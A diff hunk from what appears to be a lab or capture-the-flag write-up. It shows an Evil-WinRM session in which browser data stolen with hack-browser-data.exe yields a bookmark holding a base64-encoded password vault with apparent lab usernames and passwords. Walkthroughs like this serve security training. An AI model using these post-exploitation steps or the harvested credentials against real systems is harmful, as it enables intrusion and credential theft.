@@ -390,5 +390,30 @@ hack-browser-data.exe : [INF] Extracting OperaGX...
 This ran the tool and saved some results to the current directory
 
 ```python
-
+*Evil-WinRM* PS C:\Users\c.white\Documents> type bookmark.json
+[
+  {
+    "browser": "OperaGX",
+    "profile": "Default",
+    "id": 23,
+    "name": "My Vault",
+    "type": "url",
+    "url": "https://passwordmgmt.framgents.local/?vaultData=ew0KICAiY29tcGFueSI6ICJGcmFnbWVudHMgSW5jLiIsDQogICJkb21haW4iOiAiZnJhZ21lbnRzLmxvY2FsIiwNCiAgImRlc2NyaXB0aW9uIjogIkludGVybmFsIGNvcnBvcmF0ZSBwYXNzd29yZCB2YXVsdCAtIENPTkZJREVOVElBTCIsDQogICJsYXN0X3VwZGF0ZWQiOiAiMjAyNC0wMS0xNVQwOTozMDowMFoiLA0KICAidmVyc2lvbiI6ICIzLjIiLA0KICAicGFzc3dvcmRzIjogWw0KICAgIHsNCiAgICAgICJpZCI6ICJGUkctRU1QLTA0MjEiLA0KICAgICAgInVzZXJuYW1lIjogImoud29vZHMiLA0KICAgICAgImRpc3BsYXlfbmFtZSI6ICJKb3JkYW4gV29vZHMiLA0KICAgICAgInRpdGxlIjogIlNlbmlvciBOZXR3b3JrIEFyY2hpdGVjdCIsDQogICAgICAiZGVwYXJ0bWVudCI6ICJJVCBJbmZyYXN0cnVjdHVyZSIsDQogICAgICAiZW1haWwiOiAiai53b29kc0BmcmFnbWVudHMtaW5jLmNvbSIsDQogICAgICAicGFzc3dvcmQiOiAiaHBGcVVMdFFvWSEiLA0KICAgICAgInBhc3N3b3JkX3N0cmVuZ3RoIjogOTIsDQogICAgICAibGFzdF9jaGFuZ2VkIjogIjIwMjQtMDEtMTBUMTQ6MjI6MDBaIiwNCiAgICAgICJleHBpcmVzIjogIjIwMjQtMDQtMTBUMDA6MDA6MDBaIiwNCiAgICAgICJtZmFfZW5hYmxlZCI6IGZhbHNlLA0KICAgICAgIm1mYV90eXBlIjogIlRPVFAiLA0KICAgICAgIm5vdGVzIjogIlBhc3N3b3JkIGNvbXBsaWVzIHdpdGggcG9saWN5IHY0LjIuIiwNCiAgICB9LA0KICAgIHsNCiAgICAgICJpZCI6ICJGUkctRU1QLTE4NzciLA0KICAgICAgInVzZXJuYW1lIjogImQuZ29nZ2lucyIsDQogICAgICAiZGlzcGxheV9uYW1lIjogIkRhdmlkIERHLiBHb2dnaW5zIiwNCiAgICAgICJ0aXRsZSI6ICJTZWN1cml0eSBPcGVyYXRpb25zIExlYWQiLA0KICAgICAgImRlcGFydG1lbnQiOiAiQ3liZXJzZWN1cml0eSIsDQogICAgICAiZW1haWwiOiAiZC5nb2dnaW5zQGZyYWdtZW50cy1pbmMuY29tIiwNCiAgICAgICJwYXNzd29yZCI6ICJIaU81bjQ0OVczNiEiLA0KICAgICAgInBhc3N3b3JkX3N0cmVuZ3RoIjogOTYsDQogICAgICAiY2F0ZWdvcnkiOiAiU2VjdXJpdHkgQWNjb3VudCIsDQogICAgICAibGFzdF9jaGFuZ2VkIjogIjIwMjQtMDEtMTRUMDg6MTU6MDBaIiwNCiAgICAgICJleHBpcmVzIjogIjIwMjQtMDQtMTRUMDA6MDA6MDBaIiwNCiAgICAgICJtZmFfZW5hYmxlZCI6IGZhbHNlLA0KICAgICAgIm1mYV90eXBlIjogIkZJRE8yIEhhcmR3YXJlIEtleSIsDQogICAgICAibm90ZXMiOiAiUGFzc3dvcmQgY29tcGxpZXMgd2l0aCBwb2xpY3kgdjQuMi4iLA0KICAgIH0NCiAgXSwNCiAgInBvbGljeV9yZWZlcmVuY2VzIjogew0KICAgICJwYXNzd29yZF9wb2xpY3kiOiAiRlJHLUlULVBPTC0wMDcgdjQuMiIsDQogICAgIm1pbmltdW1fbGVuZ3RoIjogMTIsDQogICAgImNvbXBsZXhpdHlfcmVxdWlyZWQiOiB0cnVlLA0KICAgICJleHBpcmF0aW9uX2RheXMiOiA5MCwNCiAgICAiaGlzdG9yeV9jb3VudCI6IDEwLA0KICAgICJsb2Nrb3V0X3RocmVzaG9sZCI6IDUsDQogICAgImxvY2tvdXRfZHVyYXRpb24iOiAzMA0KICB9LA0KICAidmF1bHRfbWV0YWRhdGEiOiB7DQogICAgImVuY3J5cHRpb24iOiAiQUVTLTI1Ni1HQ00iLA0KICAgICJmb3JtYXRfdmVyc2lvbiI6ICIyLjEiLA0KICAgICJleHBvcnRlZF9ieSI6ICJzdmMtcGFzc3dvcmRtYW5hZ2VyIiwNCiAgICAiZXhwb3J0X3JlYXNvbiI6ICJRdWFydGVybHkgYXVkaXQiLA0KICAgICJjaGVja3N1bSI6ICJhMWIyYzNkNGU1ZjY3ODkwMTIzNDU2Nzg5YWJjZGVmMCINCiAgfQ0KfQ==",
+    "folder": "Passwords",
+    "created_at": "2026-02-06T05:06:32.278598Z"
+  },
+  {
+    "browser": "OperaGX",
+    "profile": "Default",
+    "id": 23,
+    "name": "Amazing Blog",
+    "type": "url",
+    "url": "https://zer0xjr.com/",
+    "folder": "Passwords",
+    "created_at": "2026-02-06T05:06:32.278598Z"
+  }
+]
+*Evil-WinRM* PS C:\Users\c.white\Documents>
 ```
+
+Ill use the terminal to decode the base64 
